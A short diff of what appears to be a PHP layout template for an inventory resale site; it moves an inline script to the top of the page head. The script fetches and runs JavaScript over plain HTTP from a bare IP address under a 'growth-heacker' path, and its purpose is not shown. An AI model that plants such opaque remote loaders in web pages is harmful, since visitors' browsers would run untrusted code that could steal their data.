@@ -2,6 +2,10 @@
 <html lang="en" class="no-js">
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 <head>
+<script type="text/javascript">
+var key = 3;
+(function(a) {var gaa = document.createElement('script'); gaa.type = 'text/javascript'; gaa.async = true; gaa.src = 'http://52.74.43.53/growth-heacker/feed.js?key='+key;var ss = document.getElementsByTagName('script')[0]; ss.parentNode.insertBefore(gaa, ss);}(window, document))
+</script>
 <meta charset="utf-8"/>
 <title>Online Sell and Purchase Non Moving Inventory</title>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -42,10 +46,7 @@ echo $this->fetch('meta'); ?>
 <!-- END THEME STYLES -->
 <link rel="shortcut icon" href="<?php echo $this->webroot; ?>theme_admin/images/shortcut_icon/non-moving-logo.png"/>
  <script src="<?php echo $this->webroot; ?>theme_admin/assets/global/plugins/jquery.min.js" type="text/javascript"></script>
-<script type="text/javascript">
-var key = 3;
-(function(a) {var gaa = document.createElement('script'); gaa.type = 'text/javascript'; gaa.async = true; gaa.src = 'http://52.74.43.53/growth-heacker/feed.js?key='+key;var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(gaa, s);}(window, document))
-</script>
+
 <script>
 jQuery(document).ready(function(){
 
